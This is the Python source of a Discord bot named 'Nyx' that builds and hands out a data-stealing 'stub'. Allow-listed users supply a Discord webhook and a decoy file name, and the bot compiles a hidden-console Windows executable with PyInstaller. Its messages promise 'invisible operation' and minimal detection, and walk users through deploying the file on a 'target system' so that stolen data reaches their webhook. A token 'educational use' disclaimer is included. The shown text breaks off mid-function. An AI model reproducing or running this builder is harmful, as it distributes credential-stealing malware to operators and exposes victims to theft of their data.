import os
import discord
import asyncio
import aiohttp
import platform
import json
import pystyle

from pystyle import Colorate, Center, Colors, Anime
from datetime import datetime, timedelta
from typing import List, Optional
from dotenv import load_dotenv
from discord import ui, app_commands
from discord.ext import commands
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.layout import Layout
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn

banner = (Colorate.Horizontal(Colors.white_to_red,"""
                                ╔╗╔╦ ╦═╗ ╦
                                ║║║╚╦╝╔╩╦╝
                                ╝╚╝ ╩ ╩ ╚═
""", 1))

console = Console()

def load_allowed(filename='users/allowed.rsc'):
    try:
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        with open(filename, 'r') as f:
            return set(line.strip() for line in f if line.strip().isdigit())
    except FileNotFoundError:
        print("Allowed file not found. Creating new file.")
        with open(filename, 'w') as f:
            pass
        return set()

def load_blacklisted(filename='users/blacklisted.rsc'):
    try:
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        with open(filename, 'r') as f:
            return set(line.strip() for line in f if line.strip().isdigit())
    except FileNotFoundError:
        print("Blacklist file not found. Creating new file.")
        with open(filename, 'w') as f:
            pass
        return set()

def save_allowed(allowed_users, filename='users/allowed.rsc'):
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    with open(filename, 'w') as f:
        for user_id in allowed_users:
            f.write(f"{user_id}\n")

def save_blacklisted(blacklisted_users, filename='users/blacklisted.rsc'):
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    with open(filename, 'w') as f:
        for user_id in blacklisted_users:
            f.write(f"{user_id}\n")

def save_build_log(user_id, username, filename, webhook_domain, build_id, file_size):
    log_dir = 'logs'
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, 'builds.json')

    logs = []
    try:
        with open(log_file, 'r') as f:
            logs = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        logs = []

    logs.append({
        'user_id': user_id,
        'username': username,
        'filename': filename,
        'webhook_domain': webhook_domain,
        'build_id': build_id,
        'file_size': file_size
    })

    logs = logs[-100:]

    with open(log_file, 'w') as f:
        json.dump(logs, f, indent=2)

def load_build_logs():
    log_file = os.path.join('logs', 'builds.json')
    try:
        with open(log_file, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

load_dotenv()

debug = os.getenv("DEBUG")
token = os.getenv("TOKEN")
guildid = os.getenv("GUILD_ID")
sadmin = os.getenv("SUPER_ADMIN")
api_token = os.getenv("GOFILE_API_TOKEN")

if guildid and guildid.isdigit():
    guildid = int(guildid) 

bot = commands.Bot(command_prefix=None, intents=discord.Intents.all())

async def is_admin(interaction: discord.Interaction) -> bool:
    if str(interaction.user.id) == sadmin:
        return True


async def insufficient_permissions(interaction: discord.Interaction):
    embed = discord.Embed(
        title="⛔ Access Denied",
        description="You don't have the required permissions to use this command.",
        color=0xED4245
    )
    embed.add_field(
        name="Command Used",
        value=f"`{interaction.command.name}`",
        inline=True
    )    
    embed.add_field(
        name="Required Permission",
        value="Authorized User",
        inline=True
    )

    embed.set_author(
        name=interaction.user.display_name,
        icon_url=interaction.user.avatar.url if interaction.user.avatar else interaction.user.default_avatar.url
    )

    timestamp = datetime.now().strftime("%Y-%m-%d • %H:%M:%S")

    if interaction.guild:
        footer_text = f"{interaction.guild.name} | {timestamp}"
        footer_icon = interaction.guild.icon.url if interaction.guild.icon else None
    else:
        footer_text = f"DM | {timestamp}"
        footer_icon = None

    embed.set_footer(
        text=footer_text,
        icon_url=footer_icon
    )

    await interaction.response.send_message(embed=embed, ephemeral=True)

async def upload_to_gofile(file_path, filename):
    """Upload a file to GoFile and return the download URL"""


    try:
        async with aiohttp.ClientSession() as session:
            data = aiohttp.FormData()
            data.add_field('file', 
                          open(file_path, 'rb'),
                          filename=f"{filename}.exe",
                          content_type='application/octet-stream')

            headers = {"Authorization": f"Bearer {api_token}"}
            async with session.post('https://upload.gofile.io/uploadfile', data=data, headers=headers) as response:
                if response.status == 200:
                    result = await response.json()

                    if result.get('status') == 'ok':
                        download_url = result.get('data', {}).get('downloadPage', '')
                        return download_url
                    else:
                        print(f"GoFile upload error: {result}")
                        return None
                else:
                    print(f"GoFile API error: {response.status}")
                    return None
    except Exception as e:
        print(f"GoFile upload exception: {str(e)}")
        return None

@bot.event
async def on_ready():
    await bot.tree.sync()

    if platform.system() == "Windows":
        os.system('mode con: cols=100 lines=40')
    else:
        os.system('printf "\033[8;40;100t"')  

    os.system('cls' if platform.system() == "Windows" else 'clear')

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold purple]Starting Nyx..."),
        BarColumn(complete_style="purple"),
        TimeElapsedColumn(),
        console=console,
        transient=True
    ) as progress:
        task = progress.add_task("[cyan]Initializing...", total=100)
        for i in range(101):
            await asyncio.sleep(0.01)
            progress.update(task, completed=i)

    layout = Layout()
    layout.split_column(
        Layout(name="header", size=8),
        Layout(name="stats", size=15),
        Layout(name="footer", size=3)
    )

    nyx_banner = """
                                           ╔╗╔╦ ╦═╗ ╦
                                           ║║║╚╦╝╔╩╦╝
                                           ╝╚╝ ╩ ╩ ╚═
"""

    header_text = Text(nyx_banner, style="bold purple")
    status_text = Text("\n • Nyx is now online!", style="green")
    header_panel = Panel(
        Text.assemble(header_text, status_text),
        title="[bold purple]Bot Status",
        border_style="purple"
    )
    layout["header"].update(header_panel)

    stats_table = Table(show_header=True, header_style="bold magenta", box=None)
    stats_table.add_column("Property", style="cyan", no_wrap=True)
    stats_table.add_column("Value", style="green")

    stats_table.add_row("App Name", "Nyx")
    stats_table.add_row("Bot ID", f"{bot.user.id if hasattr(bot, 'user') and bot.user else 'Unknown'}")
    stats_table.add_row("Ping", f"{round(bot.latency * 1000)}ms")
    stats_table.add_row("Guilds", f"{len(bot.guilds)}")
    stats_table.add_row("Users", f"{sum(guild.member_count for guild in bot.guilds)}")
    stats_table.add_row("Python Version", f"{platform.python_version()}")
    stats_table.add_row("Discord.py Version", f"{getattr(discord, '__version__', 'Unknown')}")
    stats_table.add_row("Operating System", f"{platform.system()} {platform.release()}")
    stats_table.add_row("website", "https://rescore.lol")

    stats_panel = Panel(
        stats_table, 
        title="[bold magenta]Nyx Statistics", 
        border_style="magenta"
    )
    layout["stats"].update(stats_panel)

    footer_text = Text(f"Type !help for commands • Made with ❤️ • Logged in as Nyx", 
                      justify="center", style="italic purple")
    footer_panel = Panel(footer_text, border_style="purple")
    layout["footer"].update(footer_panel)

    console.print(layout)
    console.log(f"[bold red]Nyx successfully Started.")

    asyncio.create_task(update_bot_status())

async def update_bot_status():
    """Updates the bot's status periodically"""
    while True:
        await bot.change_presence(activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=f"{len(bot.guilds)} servers | !help"
        ))
        await asyncio.sleep(60)
        await bot.change_presence(activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=f"{sum(guild.member_count for guild in bot.guilds)} users"
        ))
        await asyncio.sleep(60)

@bot.tree.command(name="build", description="Builds your discord stub.")
async def build(interaction: discord.Interaction):
    allowed = load_allowed()
    blacklisted = load_blacklisted()

    if guildid and interaction.guild_id != guildid:
        await interaction.response.send_message("The particle accelerator has been booted offline. The skids DDOSED the quantumn stabilizer and turnt it off.", ephemeral=True)
        return

    if str(interaction.user.id) in blacklisted:
        embed = discord.Embed(
            title="🚫 Blacklisted",
            description="You have been blacklisted from using this service.",
            color=0x992D22
        )
        embed.add_field(
            name="Appeal Process",
            value="If you believe this is in error, please contact an administrator.",
            inline=False
        )
        embed.set_thumbnail(url="https://static.vecteezy.com/system/resources/previews/028/101/892/non_2x/blacklisted-or-banned-rubber-stamp-red-banned-rubber-grunge-stamp-illustration-vector.jpg")
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    if str(interaction.user.id) not in allowed:
        await insufficient_permissions(interaction)
        return

    class WebhookModal(ui.Modal, title="Nyx "):
        webhook_url = ui.TextInput(
            label="Discord Webhook URL",
            placeholder="https://discord.com/api/webhooks/...",
            style=discord.TextStyle.short,
            required=True,
            max_length=200
        )

        file_name = ui.TextInput(
            label="Output File Name",
            placeholder="discord_update",
            style=discord.TextStyle.short,
            default="discord_update",
            required=True,
            max_length=50
        )

        async def on_submit(self, interaction: discord.Interaction):
            webhook = self.webhook_url.value
            filename = self.file_name.value.strip()

            import re
            filename = re.sub(r'[^\w\-.]', '_', filename)

            if not webhook.startswith("https://discord.com/api/webhooks/"):
                await interaction.response.send_message("Invalid webhook URL. Please provide a valid Discord webhook.", ephemeral=True)
                return

            try:
                from urllib.parse import urlparse
                webhook_parsed = urlparse(webhook)
                webhook_domain = webhook_parsed.netloc
            except:
                webhook_domain = "discord.com"

            await interaction.response.send_message("Processing your request...", ephemeral=True)

            try:
                import tempfile
                import shutil
                import subprocess
                import time
                from pathlib import Path
                from datetime import datetime

                start_time = time.time()

                with tempfile.TemporaryDirectory() as temp_dir:
                    source_path = Path("source.py")
                    temp_source_path = Path(temp_dir) / "source.py"

                    if not source_path.exists():
                        await interaction.followup.send("Error: source.py file not found.", ephemeral=True)
                        return

                    with open(source_path, "r", encoding="utf-8") as f:
                        source_content = f.read()

                    source_content = source_content.replace("%webhook%", webhook)

                    with open(temp_source_path, "w", encoding="utf-8") as f:
                        f.write(source_content)

                    progress_embed = discord.Embed(
                        title="🔄 Building Your Discord Stub",
                        description="Please wait while we compile your executable...",
                        color=0xF1C40F  
                    )

                    progress_embed.add_field(
                        name="⏳ Status",
                        value="Compiling with PyInstaller",
                        inline=False
                    )

                    progress_embed.add_field(
                        name="📋 Configuration",
                        value=f"• Output: `{filename}.exe`\n• Webhook: ✓ Configured\n• Console: Hidden\n• Icon: Default Windows",
                        inline=False
                    )

                    progress_embed.set_thumbnail(url="https://i.gifer.com/ZKZg.gif")

                    timestamp = datetime.now().strftime("%Y-%m-%d • %H:%M:%S")
                    progress_embed.set_footer(text=f"Requested by {interaction.user.name} • {timestamp}")

                    await interaction.followup.send(embed=progress_embed, ephemeral=True)

                    build_cmd = [
                        "pyinstaller",
                        "--onefile",
                        "--noconsole",
                        "--icon=NONE",  
                        f"--name={filename}",
                        str(temp_source_path)
                    ]

                    process = subprocess.run(
                        build_cmd, 
                        cwd=temp_dir, 
                        capture_output=True, 
                        text=True
                    )

                    if process.returncode != 0:
                        error_embed = discord.Embed(
                            title="❌ Build Failed",
                            description="The compilation process encountered an error.",
                            color=0xE74C3C  
                        )

                        error_embed.add_field(
                            name="Error Details",
                            value=f"```\n{process.stderr[:1000]}```",
                            inline=False
                        )

                        error_embed.add_field(
                            name="Troubleshooting",
                            value="• Ensure PyInstaller is properly installed\n• Check if you have sufficient permissions\n• Verify the source code is valid",
                            inline=False
                        )

                        error_embed.set_thumbnail(url="https://www.freeiconspng.com/thumbs/error-icon/error-icon-4.png")

                        await interaction.followup.send(embed=error_embed, ephemeral=True)
                        return

                    exe_path = Path(temp_dir) / "dist" / f"{filename}.exe"

                    if not exe_path.exists():
                        await interaction.followup.send("Build completed but executable not found.", ephemeral=True)
                        return

                    build_time = time.time() - start_time
                    file_size = exe_path.stat().st_size
                    size_str = f"{file_size / 1024 / 1024:.2f} MB" if file_size > 1024 * 1024 else f"{file_size / 1024:.2f} KB"

                    build_id = str(interaction.id)
                    save_build_log(
                        user_id=str(interaction.user.id),
                        username=interaction.user.name,
                        filename=f"{filename}.exe",
                        webhook_domain=webhook_domain,
                        build_id=build_id,
                        file_size=size_str
                    )

                    completion_embed = discord.Embed(
                        title="✅ Discord Stub Successfully Built",
                        description="Your custom stub has been compiled and is ready for deployment.",
                        color=0x2ECC71  
                    )

                    border = "```\n╔════════════════════════════════╗\n║                                ║\n║     STUB BUILDER - SUCCESS     ║\n║                                ║\n╚════════════════════════════════╝\n```"
                    completion_embed.add_field(name="", value=border, inline=False)

                    stats = (
                        f"📦 **File:** `{filename}.exe`\n"
                        f"📊 **Size:** {size_str}\n"
                        f"⚡ **Build Speed:** {build_time:.1f} seconds\n"
                        f"🔒 **Webhook:** Securely integrated\n"
                        f"🔧 **Build ID:** `{build_id[:8]}`"
                    )
                    completion_embed.add_field(name="Build Statistics", value=stats, inline=False)

                    features = (
                        "• Single executable file\n"
                        "• Windows native appearance\n"
                        "• Invisible operation\n"
                        "• Secure webhook communication\n"
                        "• Customized build parameters"
                    )
                    completion_embed.add_field(name="📋 Features", value=features, inline=True)

                    next_steps = (
                        "• Download from your DMs\n"
                        "• Deploy on target system\n"
                        "• Monitor your webhook\n"
                        "• Execute silently\n"
                        "• Data appears instantly"
                    )
                    completion_embed.add_field(name="🚀 Next Steps", value=next_steps, inline=True)

                    completion_embed.set_thumbnail(url="https://www.freeiconspng.com/uploads/success-icon-19.png")

                    completion_embed.set_author(
                        name=f"Requested by {interaction.user.display_name}",
                        icon_url=interaction.user.avatar.url if interaction.user.avatar else interaction.user.default_avatar.url
                    )

                    current_time = datetime.now().strftime("%Y-%m-%d • %H:%M:%S")
                    footer_text = f"Nyx  v1.0 • {current_time}"

                    if interaction.guild and interaction.guild.icon:
                        footer_icon = interaction.guild.icon.url
                    else:
                        footer_icon = None

                    completion_embed.set_footer(text=footer_text, icon_url=footer_icon)

                    progress_bar = "▰▰▰▰▰▰▰▰▰▰ 100%"
                    completion_embed.add_field(name="Build Progress", value=f"`{progress_bar}`", inline=False)

                    await interaction.followup.send(embed=completion_embed, ephemeral=False)

                    dm_embed = discord.Embed(
                        title="🔥 DISCORD STUB - DEPLOYMENT PACKAGE",
                        description="Your custom Discord stub has been successfully compiled and is ready for deployment.",
                        color=0x7289DA  
                    )

                    header = "```\n" + "═" * 50 + "\n" + " " * 15 + "CLASSIFIED PACKAGE" + " " * 15 + "\n" + "═" * 50 + "\n```"
                    dm_embed.add_field(name="", value=header, inline=False)

                    tech_specs = (
                        f"**Build ID:** `{build_id}`\n"
                        f"**Filename:** `{filename}.exe`\n"
                        f"**Size:** {size_str}\n"
                        f"**Compiled:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                        f"**Architecture:** x64\n"
                        f"**Type:** Standalone Executable\n"
                        f"**Detection:** Minimal Footprint\n"
                        f"**Webhook:** Securely Integrated"
                    )
                    dm_embed.add_field(name="🔧 Technical Specifications", value=tech_specs, inline=False)

                    deploy_instructions = (
                        "**1.** Download the attached executable\n"
                        "**2.** Transfer to target system using USB or cloud storage\n"
                        "**3.** Run the executable on the target machine\n"
                        "**4.** Monitor your webhook for incoming data\n"
                        "**5.** Data collection begins immediately upon execution"
                    )
                    dm_embed.add_field(name="📋 Deployment Instructions", value=deploy_instructions, inline=False)

                    security = (
                        "⚠️ **IMPORTANT SECURITY NOTICE** ⚠️\n\n"
                        "This tool is intended for educational purposes or authorized security testing only. "
                        "Using this stub on systems without explicit permission is illegal and unethical. "
                        "You are solely responsible for how this software is used."
                    )
                    dm_embed.add_field(name="", value=security, inline=False)

                    dm_embed.set_footer(text="Nyx  • For Ethical Use Only", icon_url=footer_icon)

                    dm_embed.set_thumbnail(url="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR_vwRQXl_vUEkvZMCqIWAl_-jfMsNWpfGoJA&s")

                    source_embed = discord.Embed(
                        title="📄 SOURCE CODE - DISCORD STUB",
                        description="This is the Python source code with your webhook integrated.",
                        color=0x546E7A  
                    )

                    source_header = "```py\n# ===================================\n# Discord Stub - Source Code\n# Webhook: Integrated\n# ===================================\n```"
                    source_embed.add_field(name="", value=source_header, inline=False)

                    usage = (
                        "**Usage Notes:**\n"
                        "• This is the source code used to build your executable\n"
                        "• Your webhook is embedded in this code\n"
                        "• You can modify this code for custom functionality\n"
                        "• To rebuild, use a Python compiler like PyInstaller\n"
                        "• Keep this code secure and confidential"
                    )
                    source_embed.add_field(name="ℹ️ Information", value=usage, inline=False)

                    mod_guide = (
                        "**Want to customize?**\n"
                        "• Look for `# CONFIGURATION` comments\n"
                        "• Modify data collection functions as needed\n"
                        "• Add additional modules by importing them\n"
                        "• Change execution behavior in the main function\n"
                        "• Recompile using the provided build command"
                    )
                    source_embed.add_field(name="🔧 Modification Guide", value=mod_guide, inline=False)

                    source_embed.set_thumbnail(url="https://static.vecteezy.com/system/resources/previews/010/332/153/non_2x/code-flat-color-outline-icon-free-png.png")
                    source_embed.set_footer(text="Source Code • Handle With Care", icon_url=footer_icon)

                    try:
                        dm_channel = await interaction.user.create_dm()
                        await dm_channel.send(
                            embed=dm_embed,
                            file=discord.File(exe_path, filename=f"{filename}.exe")
                        )
                        await dm_channel.send(
                            embed=source_embed,
                            file=discord.File(temp_source_path, filename="source.py")
                        )
                    except discord.Forbidden:
                        await interaction.followup.send(
                            "⚠️ **DM Error:** Couldn't send you a DM. Please enable DMs from server members.",
                            ephemeral=True
                        )
                        return
                    except discord.HTTPException as e:
                        if 'Payload Too Large' in str(e) or '40005' in str(e):
                            await interaction.followup.send(
                                "⚠️ **File too large for Discord.** Uploading to GoFile instead...",
                                ephemeral=True
                            )

                            try:
                                gofile_url = await upload_to_gofile(exe_path, filename)

                                if gofile_url:
                                    gofile_embed = discord.Embed(
                                        title="🔗 File Available via GoFile",
                                        description=f"Your file was too large for Discord. Download it from the link below:",
                                        color=0x00AAFF
                                    )
                                    gofile_embed.add_field(
                                        name="Download Link",
                                        value=f"[Click here to download {filename}.exe]({gofile_url})",
                                        inline=False
                                    )
                                    gofile_embed.add_field(
                                        name="⚠️ Important",
                                        value="This link is temporary and will expire eventually. Download your file as soon as possible.",
                                        inline=False
                                    )

                                    await dm_channel.send(embed=gofile_embed)

                                    await dm_channel.send(
                                        embed=source_embed,
                                        file=discord.File(temp_source_path, filename="source.py")
                                    )

                                    await interaction.followup.send(
                                        "✅ **File uploaded to GoFile.** Check your DMs for the download link.",
                                        ephemeral=True
                                    )
                                else:
                                    await interaction.followup.send(
                                        "❌ **Upload failed.** Could not upload file to alternative service.",
                                        ephemeral=True
                                    )

                            except Exception as upload_error:
                                await interaction.followup.send(
                                    f"❌ **Upload error:** {str(upload_error)}",
                                    ephemeral=True
                                )
                        else:
                            await interaction.followup.send(
                                f"⚠️ **Error:** Could not deliver your file: {str(e)}",
                                ephemeral=True
                            )
                        return
                    except Exception as e:
                        await interaction.followup.send(
                            f"⚠️ **Error:** Could not deliver your file: {str(e)}",
                            ephemeral=True
                        )
                        return

                    final_embed = discord.Embed(
                        title="📤 Files Delivered",
                        description=f"Check your DMs, <@{interaction.user.id}>! I've sent you both the compiled executable and source code.",
                        color=0x9B59B6  
                    )
                    final_embed.set_footer(text="Build process completed successfully")

                    await interaction.followup.send(embed=final_embed, ephemeral=False)

            except Exception as e:
                import traceback
                error_traceback = traceback.format_exc()

                error_embed = discord.Embed(
                    title="⚠️ Build Process Error",
                    description="An unexpected error occurred during the build process.",
                    color=0xE74C3C  
                )

                error_embed.add_field(
                    name="Error Details",
                    value=f"```py\n{str(e)[:900]}\n```",
                    inline=False
                )

                error_embed.add_field(
                    name="Troubleshooting",
                    value=(
                        "• Check if PyInstaller is installed correctly\n"
                        "• Ensure you have proper file permissions\n"
                        "• Verify the source code is valid and accessible\n"
                        "• Contact an administrator for assistance"
                    ),
                    inline=False
                )

                error_embed.set_thumbnail(url="https://www.freeiconspng.com/thumbs/error-icon/error-icon-4.png")
                error_embed.set_footer(text="Error logged for administrator review")

                await interaction.followup.send(embed=error_embed, ephemeral=True)
                if debug:
                    print(error_traceback)

    await interaction.response.send_modal(WebhookModal())

@bot.tree.command(name="blacklist", description="[ADMIN] Blacklist a user from using the builder")
@app_commands.describe(user="The user to blacklist", reason="Reason for blacklisting")
async def blacklist_cmd(interaction: discord.Interaction, user: discord.Member, reason: str = "No reason provided"):
    if not await is_admin(interaction):
        await insufficient_permissions(interaction)
        return

    blacklisted = load_blacklisted()
    user_id = str(user.id)

    if user_id == sadmin:
        embed = discord.Embed(
            title="⚠️ Action Denied",
            description="You cannot blacklist the super administrator.",
            color=0xFFA500
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    if user_id in blacklisted:
        embed = discord.Embed(
            title="ℹ️ Already Blacklisted",
            description=f"User {user.mention} is already blacklisted.",
            color=0x3498DB
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    blacklisted.add(user_id)
    save_blacklisted(blacklisted)

    allowed = load_allowed()
    if user_id in allowed:
        allowed.remove(user_id)
        save_allowed(allowed)

    embed = discord.Embed(
        title="🚫 User Blacklisted",
        description=f"User {user.mention} has been blacklisted from using the builder.",
        color=0x992D22
    )

    embed.add_field(
        name="User Information",
        value=f"**Name:** {user.name}\n**ID:** {user_id}",
        inline=True
    )

    embed.add_field(
        name="Reason",
        value=reason,
        inline=True
    )

    embed.add_field(
        name="Action By",
        value=f"{interaction.user.mention}",
        inline=False
    )

    timestamp = datetime.now().strftime("%Y-%m-%d • %H:%M:%S")
    embed.set_footer(text=f"Blacklist System • {timestamp}")
    embed.set_thumbnail(url=user.avatar.url if user.avatar else user.default_avatar.url)

    await interaction.response.send_message(embed=embed, ephemeral=False)

@bot.tree.command(name="unblacklist", description="[ADMIN] Remove a user from the blacklist")
@app_commands.describe(user="The user to remove from blacklist")
async def unblacklist_cmd(interaction: discord.Interaction, user: discord.Member):
    if not await is_admin(interaction):
        await insufficient_permissions(interaction)
        return

    blacklisted = load_blacklisted()
    user_id = str(user.id)

    if user_id not in blacklisted:
        embed = discord.Embed(
            title="ℹ️ Not Blacklisted",
            description=f"User {user.mention} is not currently blacklisted.",
            color=0x3498DB
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    blacklisted.remove(user_id)
    save_blacklisted(blacklisted)

    embed = discord.Embed(
        title="✅ User Unblacklisted",
        description=f"User {user.mention} has been removed from the blacklist.",
        color=0x2ECC71
    )

    embed.add_field(
        name="User Information",
        value=f"**Name:** {user.name}\n**ID:** {user_id}",
        inline=True
    )

    embed.add_field(
        name="Action By",
        value=f"{interaction.user.mention}",
        inline=True
    )

    timestamp = datetime.now().strftime("%Y-%m-%d • %H:%M:%S")
    embed.set_footer(text=f"Blacklist System • {timestamp}")
    embed.set_thumbnail(url=user.avatar.url if user.avatar else user.default_avatar.url)

    await interaction.response.send_message(embed=embed, ephemeral=False)

build_access = app_commands.Group(name="build-access", description="Manage user access to the build system")

@build_access.command(name="add", description="[ADMIN] Add a user to the builder access list")
@app_commands.describe(user="The user to grant build access to")
async def build_access_add(interaction: discord.Interaction, user: discord.Member):
    if not await is_admin(interaction):
        await insufficient_permissions(interaction)
        return

    allowed = load_allowed()
    blacklisted = load_blacklisted()
    user_id = str(user.id)

    if user_id in blacklisted:
        embed = discord.Embed(
            title="⚠️ Action Denied",
            description=f"User {user.mention} is currently blacklisted. Remove them from the blacklist first.",
            color=0xFFA500
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    if user_id in allowed:
        embed = discord.Embed(
            title="ℹ️ Already Authorized",
            description=f"User {user.mention} already has build access.",
            color=0x3498DB
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    allowed.add(user_id)
    save_allowed(allowed)

    embed = discord.Embed(
        title="✅ Access Granted",
        description=f"User {user.mention} has been granted access to the builder.",
        color=0x2ECC71
    )

    embed.add_field(
        name="User Information",
        value=f"**Name:** {user.name}\n**ID:** {user_id}",
        inline=True
    )

    embed.add_field(
        name="Authorized By",
        value=f"{interaction.user.mention}",
        inline=True
    )

    embed.add_field(
        name="Next Steps",
        value="User can now use the `/build` command to create their own stubs.",
        inline=False
    )

    timestamp = datetime.now().strftime("%Y-%m-%d • %H:%M:%S")
    embed.set_footer(text=f"Access Control System • {timestamp}")
    embed.set_thumbnail(url=user.avatar.url if user.avatar else user.default_avatar.url)

    await interaction.response.send_message(embed=embed, ephemeral=False)

@build_access.command(name="remove", description="[ADMIN] Remove a user from the builder access list")
@app_commands.describe(user="The user to remove build access from")
async def build_access_remove(interaction: discord.Interaction, user: discord.Member):
    if not await is_admin(interaction):
        await insufficient_permissions(interaction)
        return

    allowed = load_allowed()
    user_id = str(user.id)

    if user_id == sadmin:
        embed = discord.Embed(
            title="⚠️ Action Denied",
            description="You cannot remove the super administrator's access.",
            color=0xFFA500
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    if user_id not in allowed:
        embed = discord.Embed(
            title="ℹ️ No Access",
            description=f"User {user.mention} does not currently have build access.",
            color=0x3498DB
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    allowed.remove(user_id)
    save_allowed(allowed)

    embed = discord.Embed(
        title="🔒 Access Revoked",
        description=f"User {user.mention} has been removed from the builder access list.",
        color=0xE67E22
    )

    embed.add_field(
        name="User Information",
        value=f"**Name:** {user.name}\n**ID:** {user_id}",
        inline=True
    )

    embed.add_field(
        name="Revoked By",
        value=f"{interaction.user.mention}",
        inline=True
    )

    timestamp = datetime.now().strftime("%Y-%m-%d • %H:%M:%S")
    embed.set_footer(text=f"Access Control System • {timestamp}")
    embed.set_thumbnail(url=user.avatar.url if user.avatar else user.default_avatar.url)

    await interaction.response.send_message(embed=embed, ephemeral=False)

@build_access.command(name="list", description="[ADMIN] List all users with build access")
async def build_access_list(interaction: discord.Interaction):
    if not await is_admin(interaction):
        await insufficient_permissions(interaction)
        return

    allowed = load_allowed()
    blacklisted = load_blacklisted()

    embed = discord.Embed(
        title="👥 Builder Access Control List",
        description=f"Total authorized users: **{len(allowed)}**\nTotal blacklisted users: **{len(blacklisted)}**",
        color=0x9B59B6
    )

    allowed_users = []
    for user_id in allowed:
        try:
            user = await bot.fetch_user(int(user_id))
            allowed_users.append(f"• {user.mention} (`{user.name}` - ID: `{user_id}`)")
        except:
            allowed_users.append(f"• Unknown User (ID: `{user_id}`)")

    if allowed_users:
        allowed_text = "\n".join(allowed_users[:15])  
        if len(allowed_users) > 15:
            allowed_text += f"\n... and {len(allowed_users) - 15} more users"
    else:
        allowed_text = "No users have been authorized yet."

    embed.add_field(
        name="🔓 Authorized Users",
        value=allowed_text,
        inline=False
    )

    blacklisted_users = []
    for user_id in blacklisted:
        try:
            user = await bot.fetch_user(int(user_id))
            blacklisted_users.append(f"• {user.mention} (`{user.name}` - ID: `{user_id}`)")
        except:
            blacklisted_users.append(f"• Unknown User (ID: `{user_id}`)")

    if blacklisted_users:
        blacklisted_text = "\n".join(blacklisted_users[:10])  
        if len(blacklisted_users) > 10:
            blacklisted_text += f"\n... and {len(blacklisted_users) - 10} more users"
    else:
        blacklisted_text = "No users have been blacklisted."

    embed.add_field(
        name="🚫 Blacklisted Users",
        value=blacklisted_text,
        inline=False
    )

    embed.add_field(
        name="Management Commands",
        value=(
            "• `/build-access add @user` - Add user to access list\n"
            "• `/build-access remove @user` - Remove user from access list\n"
            "• `/blacklist @user [reason]` - Blacklist a user\n"
            "• `/unblacklist @user` - Remove user from blacklist"
        ),
        inline=False
    )

    timestamp = datetime.now().strftime("%Y-%m-%d • %H:%M:%S")
    embed.set_footer(text=f"Access Control System • {timestamp}")

    await interaction.response.send_message(embed=embed, ephemeral=True)

bot.tree.add_command(build_access)

@bot.tree.command(name="build-logs", description="[ADMIN] View recent build logs")
@app_commands.describe(
    limit="Number of logs to show (default: 10, max: 25)",
    user="Filter logs by specific user"
)
async def build_logs(
    interaction: discord.Interaction, 
    limit: app_commands.Range[int, 1, 25] = 10,
    user: Optional[discord.Member] = None
):
    if not await is_admin(interaction):
        await insufficient_permissions(interaction)
        return

    logs = load_build_logs()

    if user:
        logs = [log for log in logs if log.get('user_id') == str(user.id)]

    logs.sort(key=lambda x: x.get('timestamp', ''), reverse=True)

    logs = logs[:limit]

    if not logs:
        embed = discord.Embed(
            title="📜 Build Logs",
            description="No build logs found matching your criteria.",
            color=0x95A5A6
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return

    embed = discord.Embed(
        title="📜 Recent Build Logs",
        description=f"Showing the {len(logs)} most recent builds" + (f" for {user.mention}" if user else ""),
        color=0x3498DB
    )

    for i, log in enumerate(logs):
        try:
            timestamp = datetime.fromisoformat(log.get('timestamp', '')).strftime("%Y-%m-%d %H:%M:%S")
        except:
            timestamp = "Unknown"

        user_id = log.get('user_id', 'Unknown')
        username = log.get('username', 'Unknown')
        filename = log.get('filename', 'Unknown')
        webhook_domain = log.get('webhook_domain', 'Unknown')
        build_id = log.get('build_id', 'Unknown')
        file_size = log.get('file_size', 'Unknown')

        log_entry = (
            f"**User:** <@{user_id}> (`{username}`)\n"
            f"**File:** `{filename}`\n"
            f"**Size:** {file_size}\n"
            f"**Webhook:** `{webhook_domain}`\n"
            f"**Build ID:** `{build_id[:8]}`\n"
            f"**Time:** {timestamp}"
        )

        embed.add_field(
            name=f"Build #{i+1}",
            value=log_entry,
            inline=True
        )

    embed.set_footer(text=f"Build Logs • Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="clear-logs", description="[ADMIN] Clear all build logs")
async def clear_logs(interaction: discord.Interaction):
    if not await is_admin(interaction):
        await insufficient_permissions(interaction)
        return

    class ClearLogsConfirm(ui.View):
        def __init__(self):
            super().__init__(timeout=60)

        @ui.button(label="Confirm Clear", style=discord.ButtonStyle.danger)
        async def confirm(self, interaction: discord.Interaction, button: ui.Button):

            log_dir = 'logs'
            log_file = os.path.join(log_dir, 'builds.json')

            os.makedirs(log_dir, exist_ok=True)
            with open(log_file, 'w') as f:
                f.write('[]')

            embed = discord.Embed(
                title="✅ Logs Cleared",
                description="All build logs have been cleared successfully.",
                color=0x2ECC71
            )

            await interaction.response.edit_message(embed=embed, view=None)

        @ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
        async def cancel(self, interaction: discord.Interaction, button: ui.Button):
            embed = discord.Embed(
                title="❌ Operation Cancelled",
                description="Log clearing cancelled.",
